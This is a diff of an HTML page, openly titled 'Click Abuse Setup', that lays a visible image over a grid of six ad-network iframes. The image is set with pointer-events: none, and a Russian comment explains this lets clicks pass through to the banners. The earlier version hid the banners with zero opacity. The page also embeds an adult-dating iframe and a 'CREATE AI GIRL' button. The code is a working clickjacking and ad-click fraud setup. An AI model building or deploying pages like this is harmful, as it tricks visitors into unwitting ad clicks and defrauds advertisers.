@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Neon Abuse Click Page</title>
+  <title>Click Abuse Setup</title>
   <style>
     body {
       margin: 0;
@@ -12,13 +12,10 @@
       font-family: Arial, sans-serif;
     }
 
-    iframe {
-      width: 100%;
-      border: none;
-    }
-
     .iframe-top {
+      width: 100%;
       height: 70vh;
+      border: none;
     }
 
     .button-bar {
@@ -37,57 +34,66 @@
       box-shadow: 0 0 10px #8000ff;
     }
 
-    .image-wrapper {
+    .abuse-wrapper {
       position: relative;
       width: 90%;
       max-width: 600px;
-      margin: 40px auto;
+      margin: 30px auto;
+      aspect-ratio: 16/9;
     }
 
-    .image-wrapper img {
+    .abuse-wrapper img {
       width: 100%;
+      height: 100%;
+      object-fit: cover;
       border-radius: 10px;
       box-shadow: 0 0 20px #8000ff;
-      position: relative;
-      z-index: 2;
-    }
-
-    .hidden-banners {
       position: absolute;
       top: 0;
       left: 0;
-      z-index: 1;
-      width: 100%;
-      height: 100%;
+      z-index: 2;
+      pointer-events: none; /* Чтобы клики проходили сквозь изображение */
+    }
+
+    .banner-grid {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
       grid-template-rows: repeat(2, 1fr);
       gap: 5px;
-      opacity: 0;
-      pointer-events: auto;
-    }
-
-    .hidden-banners iframe {
       width: 100%;
       height: 100%;
+      position: absolute;
+      top: 0;
+      left: 0;
+      z-index: 1;
+    }
+
+    .banner-grid iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
     }
 
     .iframe-bottom {
+      width: 100%;
       height: 30vh;
+      border: none;
     }
   </style>
 </head>
 <body>
 
+  <!-- Верхний iframe -->
   <iframe class="iframe-top" src="https://biieiae.flirtosmart.com/s/4e05b3267d2c9"></iframe>
 
+  <!-- Кнопка -->
   <div class="button-bar">
     <button>CREATE AI GIRL</button>
   </div>
 
-  <div class="image-wrapper">
-    <!-- Скрытая сетка баннеров -->
-    <div class="hidden-banners">
+  <!-- Изображение поверх кликабельных баннеров -->
+  <div class="abuse-wrapper">
+    <div class="banner-grid">
       <iframe src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js"></iframe>
       <iframe src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js"></iframe>
       <iframe src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js"></iframe>
@@ -95,11 +101,10 @@
       <iframe src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js"></iframe>
       <iframe src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js"></iframe>
     </div>
-
-    <!-- Видимое изображение -->
-    <img src="IMG_20250719_192733_771.jpg" alt="Main Visual">
+    <img src="IMG_20250719_192733_771.jpg" alt="Main Image">
   </div>
 
+  <!-- Нижний iframe -->
   <iframe class="iframe-bottom" src="https://zloberka.github.io/love/I2.html"></iframe>
 
 </body>
